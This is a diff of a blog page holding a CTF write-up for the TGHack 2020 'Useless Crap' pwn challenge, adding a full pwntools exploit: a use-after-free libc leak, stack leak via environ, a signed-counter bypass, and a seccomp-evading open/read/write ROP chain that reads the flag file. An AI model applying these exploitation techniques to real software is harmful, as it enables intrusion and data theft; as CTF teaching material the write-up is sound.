@@ -568,7 +568,7 @@
   
   <span class="middot-divider"></span>
   <span class="article-reading-time">
-    6 min read
+    12 min read
   </span>
   
 
@@ -648,7 +648,8 @@
 <li>Write open/read/write ROP chain after srip of main function using allowed syscalls</li>
 <li>Stack pivot to our ROP chain and read flag.txt</li>
 </ul>
-<p>TGHack 2020 had some challenging PWN tasks, and Useless Crap was one of the hardest that we were able to solve during the CTF.</p>
+<p>TGHack 2020 had some challenging PWN tasks, and Useless Crap was one of the hardest that we were able to solve during the CTF with our teammate 
+<a href="https://twitter.com/ThamerBaccouch" target="_blank" rel="noopener">Aracna</a>.</p>
 <p>As Detailed in the description of the challenge, the author provided the necessary files to run the binary as intended, our first thought was how to patch the binary to use the provided libc and ld files instead of our system libraries. Because this will make it easier for us when developing our exploit in a way that offsets are the same locally and remotely.</p>
 <p>To make this happen we always patch the binary using the method described at 
 <a href="https://www.ayrx.me/using-a-non-system-libc" target="_blank" rel="noopener">Using Non-system Glibc</a></p>
@@ -728,7 +729,7 @@ line  CODE  JT   JF      K
 </code></pre>
 <p>We can see that <span style="color :#dd446b">execve</span> and <span style="color :#dd446b">execveat</span> are blocked, which means no shell for us, <span style="color:#dd446b">fork/vfork/clone</span> are blocked, so we can&rsquo;t create new processes that are free of these seccomp restrictions.
 Our approach is to use ORW (<span style="color :#dd446b">open read write</span>) capabilities but we should keep in mind that at lines <em>11-13</em>  the program checks the first argument passed to read syscall and verify if it&rsquo;s equal to 0 or not. If it&rsquo;s the case then we will be allowed else the syscall will be blocked which means that we can only read from <span style="color :#dd446b">stdin</span> with same analogy we can write only to <span style="color :#dd446b">stdout</span>.</p>
-<p>Now moving to the main function, the program defines two major functions  <span style="color :#dd446b">do_read()</span> and <span style="color :#dd446b">do_write()</span> which are made for arbitrary 8 bytes read/write . this functions can be called only once but this will be bypassed later.</p>
+<p>Now moving to the main function, the program defines two major functions  <span style="color :#dd446b">do_read()</span> and <span style="color :#dd446b">do_write()</span> which are made for arbitrary 8 bytes read/write . this functions can be called only twice but this will be bypassed later.</p>
 <pre><code class="language-c">// read from arbitrary address
 __int64 do_read()
 {
@@ -823,6 +824,339 @@ int view_feedback()
 <p>The freed chunk&rsquo;s data (<strong>FD</strong> and <strong>BK</strong> pointers) now holds a libc address that we will use in <span style="color :#dd446b">view_feedback </span>to print its content because the author doesn&rsquo;t check if the chunk if freed or not before passing it to puts function thus trigger a UAF that leads to leaking libc address.</p>
 </li>
 </ol>
+<p>We start by implementing the functions needed to communicate with the binary.</p>
+<pre><code class="language-python">from pwn import *
+
+def leave_feedback(s,feedback,free=True):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)
+    s.sendline(feedback)
+    if free:
+        s.sendline(&quot;n&quot;)
+    else:
+        s.sendline(&quot;y&quot;)
+
+def view_feedback(s):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)
+    s.recvuntil(&quot;feedback: &quot;)
+    data = s.recvuntil(&quot;\n&quot;).strip()
+    return data
+
+p = process(&quot;./new_crap&quot;)
+leave_feedback(p,&quot;abc&quot;)
+libc_addr = view_feedback(p)
+leaked_fd = u64(libc_addr.ljust(8,&quot;\x00&quot;))
+print &quot;leaked address :&quot;,hex(leaked_fd)
+</code></pre>
+<p>Running the above snippet give us the libc address</p>
+<pre><code class="language-bash">$ python sploit.py 
+[+] Starting local process './new_crap': pid 28823
+leaked address : 0x7f24bb47abe0
+[*] Stopped process './new_crap' (pid 28823)
+
+</code></pre>
+<p>Now we got the libc address, we need to calculate the libc base and the different useful offsets that we will need later.
+We can do this by setting a breakpoint or attaching the process while being in interactive mode. We prefer the second method.</p>
+<pre><code class="language-c#">gdb-peda$ vmmap 
+Start              End                Perm	Name
+0x0000563fdba91000 0x0000563fdba96000 r-xp	/home/anisboss/pwn/tg/pwn/crap/final/final
+0x0000563fdbc95000 0x0000563fdbc96000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/final
+0x0000563fdbc96000 0x0000563fdbc97000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/final
+0x0000563fdbe97000 0x0000563fdbe98000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/final
+0x0000563fdc298000 0x0000563fdc299000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/final
+0x0000563fdca99000 0x0000563fdca9a000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/final
+0x0000563fdd802000 0x0000563fdd823000 rw-p	[heap]
+0x00007fb2d5139000 0x00007fb2d52eb000 r-xp	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
+0x00007fb2d52eb000 0x00007fb2d54ea000 ---p	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
+0x00007fb2d54ea000 0x00007fb2d54ee000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
+0x00007fb2d54ee000 0x00007fb2d54f0000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/libc.so.6
+0x00007fb2d54f0000 0x00007fb2d54f4000 rw-p	mapped
+[...]
+0x00007fb2d54f4000 0x00007fb2d551c000 r-xp	/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so
+0x00007fb2d571b000 0x00007fb2d571c000 r--p	/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so
+0x00007fb2d571c000 0x00007fb2d571d000 rw-p	/home/anisboss/pwn/tg/pwn/crap/final/ld-2.31.so
+0x00007fb2d571d000 0x00007fb2d571e000 rw-p	mapped
+0x00007fff7ab85000 0x00007fff7aba6000 rw-p	[stack]
+0x00007fff7abd1000 0x00007fff7abd4000 r--p	[vvar]
+0x00007fff7abd4000 0x00007fff7abd6000 r-xp	[vdso]
+
+gdb-peda$ p 0x7fb2d54eebe0 - 0x00007fb2d5139000
+$1 = 0x3b5be0 //offset from libc base
+</code></pre>
+<p>The next step is to get infinite read/write primitive in order to read and write data to bypass the restriction made in the binary. To do this we need to get the address of variables <span style="color :#dd446b">write_count</span> and <span style="color :#dd446b">read_count</span> located in <strong>.bss</strong>.</p>
+<p>In order to leak a stack address from libc, There is a symbol <span style="color :#dd446b">environ</span> in libc, whose value is the same as the third argument of <code>main</code> function, <span style="color :#dd446b">char **envp</span>. The value of <span style="color :#dd446b">char **envp</span> is on the stack, thus we can leak stack address with this symbol.</p>
+<pre><code class="language-bash">$ readelf -s ./libc.so.6 |grep -i environ
+   299: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 _environ@@GLIBC_2.2.5
+  1021: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 environ@@GLIBC_2.2.5
+  1373: 00000000003b8618     8 OBJECT  GLOBAL DEFAULT   32 __environ@@GLIBC_2.2.5
+   405: 00000000003b6c78     8 OBJECT  LOCAL  DEFAULT   32 last_environ
+  1817: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS environ.c
+  4800: 0000000000037d10   953 FUNC    LOCAL  DEFAULT   13 __add_to_environ
+  6190: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 _environ
+  6916: 00000000003b8618     8 OBJECT  GLOBAL DEFAULT   32 __environ
+  7031: 00000000003b8618     8 OBJECT  WEAK   DEFAULT   32 environ
+
+</code></pre>
+<p>Since at first we have only two shots for both read and write functions let&rsquo;s use the read at first to read the stack address then we will look into the stack for an address pointing to our binary when found we calculate the distance between that address and binary base then we conclude the address of write_count/read_count. Now we got what we need, let&rsquo;s develop the write/read functions in our exploit and get the needed values.</p>
+<pre><code class="language-python">from pwn import *
+
+def read(s,addr):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)
+    s.sendlineafter(&quot;addr: &quot;,addr)
+    p.recvuntil(&quot;value: &quot;)
+    leaked = p.recvline()
+    return leaked.strip()
+
+def write(s,addr,value):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;)
+    s.sendline(hex(addr)+ &quot; &quot; + hex(value))
+
+def leave_feedback(s,feedback,free=True):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)
+    s.sendline(feedback)
+    if free:
+        s.sendline(&quot;n&quot;)
+    else:
+        s.sendline(&quot;y&quot;)
+
+def view_feedback(s):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)
+    s.recvuntil(&quot;feedback: &quot;)
+    data = s.recvuntil(&quot;\n&quot;).strip()
+    return data
+
+p = process(&quot;./new_crap&quot;)
+leave_feedback(p,&quot;abc&quot;)
+libc_addr = view_feedback(p)
+leaked_fd = u64(libc_addr.ljust(8,&quot;\x00&quot;))
+print &quot;leaked address :&quot;,hex(leaked_fd)
+base = leaked_fd - 3890144
+print &quot;libc_base : &quot;,hex(base)
+environ = base + 0x00000000003b8618
+print &quot;environ_libc : &quot;,hex(environ)
+leaked_stack = int(read(p,hex(environ)),16)
+print &quot;leaked_stack : &quot;,hex(leaked_stack)
+to_leak = leaked_stack -264
+leaked_bin = int(read(p,hex(to_leak)),16)
+bin_base = leaked_bin - 4640
+print &quot;binary base : &quot;,hex(bin_base)
+bss = bin_base + 0x0000000000205010
+write_count = bin_base+0x0000000000202034
+feedback = write_count+0x4
+read_count = write_count - 0x4
+print &quot;feedback: &quot;,hex(feedback)
+print &quot;write_count: &quot;,hex(write_count)
+print &quot;read_count: &quot;,hex(read_count)
+#gdb.attach(p)
+p.interactive()
+</code></pre>
+<pre><code class="language-bash">$ python sploit.py 
+[+] Starting local process './new_crap': pid 29333
+leaked address : 0x7fba2c791be0
+libc_base :  0x7fba2c3dc000
+environ_libc :  0x7fba2c794618
+leaked_stack :  0x7fff22ca9f88
+binary base :  0x555a6cb69000
+feedback:  0x555a6cd6b038
+write_count:  0x555a6cd6b034
+read_count:  0x555a6cd6b030
+[*] Switching to interactive mode
+&gt; $  
+</code></pre>
+<p>Now we have the addresses of <span style="color :#dd446b">write_count</span> and <span style="color :#dd446b">read_count</span> variables, and since the binary is making a signed comparison , we can put negative values in our case we will choose -200 which is in hex 0xffffff38.</p>
+<pre><code class="language-python">write(p,read_count,0)
+write(p,write_count,4294967096)
+</code></pre>
+<p>Our methodology is to build a ROP chain, at first we tried to overwrite manually the return pointer of <span style="color :#dd446b">do_write()</span> function with <span style="color :#dd446b">leave ;  ret </span> gadget after performing those instructions the program returned to saved return pointer of the main function  so if we overwrite <strong>srip</strong> of main with our gadgets we can successfully pivot to our ROP chain.</p>
+<p>To do so, following the seccomp rules defined in the binary we should construct an <strong>open/read/write</strong> rop chain. And since we are allowed only to read from stdin therefore the <strong>File Descriptor</strong> returned by <span style="color :#dd446b">open </span>syscall must be 0.</p>
+<blockquote>
+<p>as we know that <strong>FD</strong>s 0,1,2 are reserverd by <strong>stdin</strong>,<strong>stdout</strong> and <strong>stderr</strong> respectively. <span style="color :#dd446b">Open</span>  operation will return the first free <strong>FD</strong> (starting from 0)  ; so if we perform a <span style="color :#dd446b">close(0)</span> call before opening the flag file ; the next <span style="color :#dd446b">open</span> syscall will find the FD 0 is free and will assign it to the opened file.</p>
+</blockquote>
+<p>To Build such ropchain, we need to find gadgets to control the different registers <strong>rax,rdi,rsi,rdx</strong> we can get these useful gadgets from libc using the 
+<a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">ropper</a> tool.</p>
+<pre><code class="language-bash">$ ropper --file ./libc.so.6 --search 'pop r?x; ret;|pop r?i; ret;' 
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop r?x; ret;|pop r?i; ret;
+
+[INFO] File: ./libc.so.6
+0x0000000000038e88: pop rax; ret; 
+0x000000000002bc45: pop rbx; ret; 
+0x0000000000021882: pop rdi; ret; 
+0x0000000000001b9a: pop rdx; ret; 
+0x0000000000022192: pop rsi; ret; 
+
+</code></pre>
+<p>We need to store the flag path somewhere, we chose heap since we have a function that allocates a chunk with controlled data for us. Before that we need to overwrite <strong>feedback</strong> variable with 0 in order to be able to use <span style="color :#dd446b">leave_feedback</span> again.
+The <strong>Foward Pointer</strong> leaked in the first step contains a heap pointer we will use the do_read() to leak its content thus we can calculate the <strong>flag</strong> path address which is the address of the new allocated chunk.</p>
+<pre><code class="language-python">leaked_heap=int(read(p,hex(leaked_fd)),16)
+print &quot;leaked_heap :&quot;,hex(leaked_heap)
+flag_file=leaked_heap-0x1260
+print &quot;flag_file :&quot;,hex(flag_file)
+write(p,feedback,0)
+leave_feedback(p,&quot;/home/crap/flag.txt\x00&quot;,False) #flag path will be at flag_file address
+</code></pre>
+<p>Our next step is to construct the final ROP chain using obtained gadgets.</p>
+<pre><code class="language-python">pop_rax = base+0x0000000000038e88
+syscall_ret = base+0x0000000000039049
+pop_rdi = base + 0x0000000000021882
+pop_rsi = base + 0x0000000000022192
+pop_rdx = base + 0x0000000000001b9a
+leave_ret = base + 0x0000000000040222
+
+rop_chain=[
+pop_rdi,
+0,
+pop_rax,
+3,
+syscall_ret, #close(0)
+pop_rdi,
+flag_file,
+pop_rsi,
+0,
+pop_rax,
+0x2,
+pop_rdx,
+0,
+syscall_ret, #open(flag_file,0,0) &lt;== this will return 0 as File Descriptor
+pop_rdi,
+0,
+pop_rsi,
+flag_file,
+pop_rdx,
+0x100,
+pop_rax,
+0x0,
+syscall_ret,#read(0,flag_file,0x100)
+pop_rdi,
+1,
+pop_rsi,
+flag_file,
+pop_rdx,
+0x100,
+pop_rax,
+0x1,
+syscall_ret #write(1,flag_file,0x100)
+]
+</code></pre>
+<p>Now we just need to calculate the srip of <span style="color :#dd446b">main</span> and <span style="color :#dd446b">do_write</span> functions and place our ROP chain in the stack.</p>
+<p>The final exploit:</p>
+<pre><code class="language-python">from pwn import *
+
+def read(s,addr):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;1&quot;)
+    s.sendlineafter(&quot;addr: &quot;,addr)
+    p.recvuntil(&quot;value: &quot;)
+    leaked = p.recvline()
+    return leaked.strip()
+
+def write(s,addr,value):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;2&quot;)
+    s.sendline(hex(addr)+ &quot; &quot; + hex(value))
+
+def leave_feedback(s,feedback,free=True):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;3&quot;)
+    s.sendline(feedback)
+    if free:
+        s.sendline(&quot;n&quot;)
+    else:
+        s.sendline(&quot;y&quot;)
+
+def view_feedback(s):
+    s.sendlineafter(&quot;&gt; &quot;,&quot;4&quot;)
+    s.recvuntil(&quot;feedback: &quot;)
+    data = s.recvuntil(&quot;\n&quot;).strip()
+    return data
+
+p = process(&quot;./new_crap&quot;)
+leave_feedback(p,&quot;abc&quot;)
+libc_addr = view_feedback(p)
+leaked_fd = u64(libc_addr.ljust(8,&quot;\x00&quot;))
+print &quot;leaked address :&quot;,hex(leaked_fd)
+base = leaked_fd - 3890144
+print &quot;libc_base : &quot;,hex(base)
+environ = base + 0x00000000003b8618
+print &quot;environ_libc : &quot;,hex(environ)
+leaked_stack = int(read(p,hex(environ)),16)
+print &quot;leaked_stack : &quot;,hex(leaked_stack)
+to_leak = leaked_stack -264
+leaked_bin = int(read(p,hex(to_leak)),16)
+bin_base = leaked_bin - 4640
+print &quot;binary base : &quot;,hex(bin_base)
+bss = bin_base + 0x0000000000205010
+write_count = bin_base+0x0000000000202034
+feedback = write_count+0x4
+read_count = write_count - 0x4
+print &quot;feedback: &quot;,hex(feedback)
+print &quot;write_count: &quot;,hex(write_count)
+print &quot;read_count: &quot;,hex(read_count)
+
+write(p,read_count,0)
+write(p,write_count,4294967096)
+
+leaked_heap=int(read(p,hex(leaked_fd)),16)
+print &quot;leaked_heap :&quot;,hex(leaked_heap)
+flag_file=leaked_heap-0x1260
+print &quot;flag_file :&quot;,hex(flag_file)
+write(p,feedback,0)
+leave_feedback(p,&quot;/home/crap/flag.txt\x00&quot;,False) #flag path will be at flag_file address
+eip_main=leaked_stack-256
+eip_do_write=eip_main-32
+print &quot;seip_main: &quot;,hex(eip_main)
+print &quot;seip_do_write: &quot;,hex(eip_do_write)
+pop_rax = base+0x0000000000038e88
+syscall_ret = base+0x0000000000039049
+pop_rdi = base + 0x0000000000021882
+pop_rsi = base + 0x0000000000022192
+pop_rdx = base + 0x0000000000001b9a
+leave_ret = base + 0x0000000000040222
+
+rop_chain=[
+pop_rdi,
+0,
+pop_rax,
+3,
+syscall_ret, #close(0)
+pop_rdi,
+flag_file,
+pop_rsi,
+0,
+pop_rax,
+0x2,
+pop_rdx,
+0,
+syscall_ret, #open(flag_file,0,0) &lt;== this will return 0 as File Descriptor
+pop_rdi,
+0,
+pop_rsi,
+flag_file,
+pop_rdx,
+0x100,
+pop_rax,
+0x0,
+syscall_ret,#read(0,flag_file,0x100)
+pop_rdi,
+1,
+pop_rsi,
+flag_file,
+pop_rdx,
+0x100,
+pop_rax,
+0x1,
+syscall_ret #write(1,flag_file,0x100)
+]
+
+#write our rop chain in the stack
+for i in range(len(rop_chain)):
+	write(p,eip_main+(i*8),rop_chain[i])
+
+#pause()
+write(p,eip_do_write,leave_ret)
+p.interactive()
+
+</code></pre>
+<p>And Here we go \o/ !
+<img src="/img/flag.png" alt="flag"></p>
 
     </div>
 
